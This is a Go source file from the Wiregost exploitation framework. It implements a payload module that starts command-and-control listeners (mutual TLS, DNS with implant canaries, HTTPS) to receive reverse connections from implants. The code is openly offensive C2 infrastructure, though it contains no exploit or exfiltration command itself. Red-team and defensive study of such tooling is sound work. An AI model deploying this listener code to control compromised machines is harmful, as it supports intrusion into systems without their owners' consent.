// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

// CHANGE THE NAME OF THE PACKAGE WITH THE NAME OF YOUR MODULE/DIRECTORY
package reverse_multi_protocol

import (
	"crypto/tls"
	"errors"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/evilsocket/islazy/fs"
	"github.com/evilsocket/islazy/tui"
	consts "github.com/maxlandon/wiregost/client/constants"
	pb "github.com/maxlandon/wiregost/protobuf/client"
	"github.com/maxlandon/wiregost/server/assets"
	"github.com/maxlandon/wiregost/server/c2"
	"github.com/maxlandon/wiregost/server/core"
	"github.com/maxlandon/wiregost/server/log"
	"github.com/maxlandon/wiregost/server/module/templates"
)

// metadataFile - Full path to module metadata
var metadataFile = filepath.Join(assets.GetModulesDir(), "payload/multi/single/reverse_multi_protocol/metadata.json")

// [ Base Methods ] ------------------------------------------------------------------------//

// ReverseMulti - A single stage MTLS implant
type ReverseMulti struct {
	Base *templates.Module
}

// New - Instantiates a reverse MTLS module, empty.
func New() *ReverseMulti {
	return &ReverseMulti{Base: &templates.Module{}}
}

// Init - Module initialization, loads metadata. ** DO NOT ERASE **
func (s *ReverseMulti) Init() error {
	return s.Base.Init(metadataFile)
}

// ToProtobuf - Returns protobuf version of module
func (s *ReverseMulti) ToProtobuf() *pb.Module {
	return s.Base.ToProtobuf()
}

// SetOption - Sets a module option through its base object.
func (s *ReverseMulti) SetOption(option, name string) {
	s.Base.SetOption(option, name)
}

// [ Module Methods ] ------------------------------------------------------------------------//

var rpcLog = log.ServerLogger("rpc", "server")

// Run - Module entrypoint. ** DO NOT ERASE **
func (s *ReverseMulti) Run(command string) (result string, err error) {

	switch command {

	case "to_listener":

		// MTLS ---------------------------------------------------//
		host := s.Base.Options["MTLSLHost"].Value
		portUint, _ := strconv.Atoi(s.Base.Options["MTLSLPort"].Value)
		port := uint16(portUint)

		mtlsResult := ""
		var mtlsError error

		// If values are set, start MTLS listener
		if (host != "") && (s.Base.Options["MTLSLPort"].Value != "") {

			ln, err := c2.StartMutualTLSListener(host, port)
			if err != nil {
				mtlsError = err
			}

			job := &core.Job{
				ID:          core.GetJobID(),
				Name:        "mTLS",
				Description: "Mutual TLS listener",
				Protocol:    "tcp",
				Port:        port,
				JobCtrl:     make(chan bool),
			}

			go func() {
				<-job.JobCtrl
				rpcLog.Infof("Stopping mTLS listener (%d) ...", job.ID)
				ln.Close() // Kills listener GoRoutines in startMutualTLSListener() but NOT connections

				core.Jobs.RemoveJob(job)

				core.EventBroker.Publish(core.Event{
					Job:       job,
					EventType: consts.StoppedEvent,
				})
			}()

			core.Jobs.AddJob(job)

			mtlsResult = fmt.Sprintf("Reverse Mutual TLS listener started at %s:%d \n", host, port)

		}

		// DNS -------------------------------------------------//
		// Listener domains
		domains := strings.Split(s.Base.Options["DomainsDNSListener"].Value, ",")

		dnsResult := ""

		// If DNS domains are set, start listener
		if (len(domains) >= 1 && (domains[0] != "")) || ((len(domains) == 1) && (domains[0] != "")) {

			for _, domain := range domains {
				if !strings.HasSuffix(domain, ".") {
					domain += "."
				}
			}

			// Implant canaries
			enableCanaries := true
			if s.Base.Options["DisableCanaries"].Value == "true" {
				enableCanaries = false
			}

			server := c2.StartDNSListener(domains, enableCanaries)
			description := fmt.Sprintf("%s (canaries %v)", strings.Join(domains, " "), enableCanaries)

			job := &core.Job{
				ID:          core.GetJobID(),
				Name:        "dns",
				Description: description,
				Protocol:    "udp",
				Port:        53,
				JobCtrl:     make(chan bool),
			}

			go func() {
				<-job.JobCtrl
				rpcLog.Infof("Stopping DNS listener (%d) ...", job.ID)
				server.Shutdown()

				core.Jobs.RemoveJob(job)

				core.EventBroker.Publish(core.Event{
					Job:       job,
					EventType: consts.StoppedEvent,
				})
			}()

			core.Jobs.AddJob(job)

			// There is no way to call DNS's ListenAndServe() without blocking
			// but we also need to check the error in the case the server
			// fails to start at all, so we setup all the Job mechanics
			// then kick off the server and if it fails we kill the job
			// ourselves.
			go func() {
				err := server.ListenAndServe()
				if err != nil {
					rpcLog.Errorf("DNS listener error %v", err)
					job.JobCtrl <- true
				}
			}()

			dnsResult = fmt.Sprintf("%s[*]%s Reverse DNS listener started with parent domain(s) %v...\n", tui.GREEN, tui.RESET, domains)
		}

		// HTTPS ---------------------------------------------//
		host = s.Base.Options["HTTPLHost"].Value
		portUint, _ = strconv.Atoi(s.Base.Options["HTTPLPort"].Value)
		port = uint16(portUint)
		addr := fmt.Sprintf("%s:%d", host, port)
		domain := s.Base.Options["LimitResponseDomain"].Value
		website := s.Base.Options["Website"].Value
		letsEncrypt := false
		if s.Base.Options["LetsEncrypt"].Value == "true" {
			letsEncrypt = true
		}

		httpsResult := ""
		var httpError error

		// If values are set, start HTTPS listener
		if (host != "") && (s.Base.Options["HTTPLPort"].Value != "") {

			certFile, _ := fs.Expand(s.Base.Options["Certificate"].Value)
			keyFile, _ := fs.Expand(s.Base.Options["Key"].Value)
			cert, key, err := getLocalCertificatePair(certFile, keyFile)
			if err != nil {
				return "", errors.New(fmt.Sprintf("Failed to load local certificate %v", err))
			}

			conf := &c2.HTTPServerConfig{
				Addr:    addr,
				LPort:   port,
				Secure:  true,
				Domain:  domain,
				Website: website,
				Cert:    cert,
				Key:     key,
				ACME:    letsEncrypt,
			}

			server := c2.StartHTTPSListener(conf)
			if server == nil {
				httpError = errors.New("HTTP Server instantiation failed")
			}

			job := &core.Job{
				ID:          core.GetJobID(),
				Name:        "https",
				Description: fmt.Sprintf("HTTPS C2 server (https for domain %s)", conf.Domain),
				Protocol:    "tcp",
				Port:        port,
				JobCtrl:     make(chan bool),
			}

			core.Jobs.AddJob(job)
			cleanup := func(err error) {
				server.Cleanup()
				core.Jobs.RemoveJob(job)
				core.EventBroker.Publish(core.Event{
					Job:       job,
					EventType: consts.StoppedEvent,
					Err:       err,
				})
			}
			once := &sync.Once{}

			go func() {
				var err error
				if server.Conf.ACME {
					err = server.HTTPServer.ListenAndServeTLS("", "") // ACME manager pulls the certs under the hood
				} else {
					err = listenAndServeTLS(server.HTTPServer, conf.Cert, conf.Key)
				}
				if err != nil {
					rpcLog.Errorf("HTTPS listener error %v", err)
					once.Do(func() { cleanup(err) })
					job.JobCtrl <- true // Cleanup other goroutine
				}

			}()

			go func() {
				<-job.JobCtrl
				once.Do(func() { cleanup(nil) })
			}()

			httpsResult = fmt.Sprintf("%s[*]%s Reverse HTTPS listener started at %s:%d", tui.GREEN, tui.RESET, host, port)
		}

		totalResult := fmt.Sprintf(mtlsResult + dnsResult + httpsResult)

		if mtlsError != nil {
			return "", mtlsError
		} else if httpError != nil {
			return mtlsResult, httpError
		} else {
			return totalResult, nil
		}
	}

	return "", nil
}

// [ HTTPS helpers ] ----------------------------------------------------------------------//

func getLocalCertificatePair(certFile, keyFile string) ([]byte, []byte, error) {
	if certFile == "" && keyFile == "" {
		return nil, nil, nil
	}
	cert, err := ioutil.ReadFile(certFile)
	if err != nil {
		return nil, nil, err
	}
	key, err := ioutil.ReadFile(keyFile)
	if err != nil {
		return nil, nil, err
	}
	return cert, key, nil
}

// Fuck'in Go - https://stackoverflow.com/questions/30815244/golang-https-server-passing-certfile-and-kyefile-in-terms-of-byte-array
// basically the same as server.ListenAndServerTLS() but we can pass in byte slices instead of file paths
func listenAndServeTLS(srv *http.Server, certPEMBlock, keyPEMBlock []byte) error {
	addr := srv.Addr
	if addr == "" {
		addr = ":https"
	}
	config := &tls.Config{}
	if srv.TLSConfig != nil {
		*config = *srv.TLSConfig
	}
	if config.NextProtos == nil {
		config.NextProtos = []string{"http/1.1"}
	}

	var err error
	config.Certificates = make([]tls.Certificate, 1)
	config.Certificates[0], err = tls.X509KeyPair(certPEMBlock, keyPEMBlock)
	if err != nil {
		return err
	}

	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}

	tlsListener := tls.NewListener(tcpKeepAliveListener{ln.(*net.TCPListener)}, config)
	return srv.Serve(tlsListener)
}

// tcpKeepAliveListener sets TCP keep-alive timeouts on accepted
// connections. It's used by ListenAndServe and ListenAndServeTLS so
// dead TCP connections (e.g. closing laptop mid-download) eventually
// go away.
type tcpKeepAliveListener struct {
	*net.TCPListener
}

func (ln tcpKeepAliveListener) Accept() (c net.Conn, err error) {
	tc, err := ln.AcceptTCP()
	if err != nil {
		return
	}
	tc.SetKeepAlive(true)
	tc.SetKeepAlivePeriod(3 * time.Minute)
	return tc, nil
}